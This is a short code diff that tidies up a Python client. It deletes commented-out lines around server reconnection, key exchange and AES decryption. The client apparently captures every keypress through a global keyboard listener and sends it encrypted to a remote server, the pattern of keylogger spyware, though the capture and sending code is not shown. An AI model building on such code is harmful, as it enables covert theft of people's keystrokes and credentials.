@@ -107,27 +107,15 @@ def connect():
             print(colored("[-] Failed to connect to the server", "red"))
             if exit_program:
                 return
-            # return False
 
         except Exception as e:
             print(e.with_traceback(None))
             if exit_program:
                 return
-            # return False
         
         sleep(10)
 
     return
-
-
-# def listen_for_server():
-#     while not is_server_connected:
-#         sleep(10)
-
-#     s.settimeout(None)
-
-#     data = s.recv(1024)
-
 
 def exchange_keys():
     global server_key, s, RSA_KEY_LEN, aes_key
@@ -158,7 +146,7 @@ def aes_decrypt(ciphertext : bytes) -> str:
     global aes_key
     if "str" in str(type(ciphertext)):
         ciphertext = ciphertext.encode()
-    # iv = b"fw%Su!ap6#RppD(6"
+
     iv = ciphertext[:AES.block_size]
     cipher = AES.new(aes_key, AES.MODE_CFB, iv)
     plaintext = cipher.decrypt(ciphertext[AES.block_size:]).decode('utf-8', errors='ignore')
@@ -174,7 +162,6 @@ def main():
     is_server_connected = False
     exit_program = False
     buffer = ""
-    
 
     global MAX_BUFFER_SIZE, RSA_KEY_LEN
     RSA_KEY_LEN = 1024
@@ -182,9 +169,6 @@ def main():
 
     thread_connect = Thread(target=connect)
     thread_connect.start()
-
-    #// thread_listen = Thread(target=listen_for_server)
-    #// thread_listen.start()
 
     with Listener(on_press=on_press) as listener:
         listener.join()
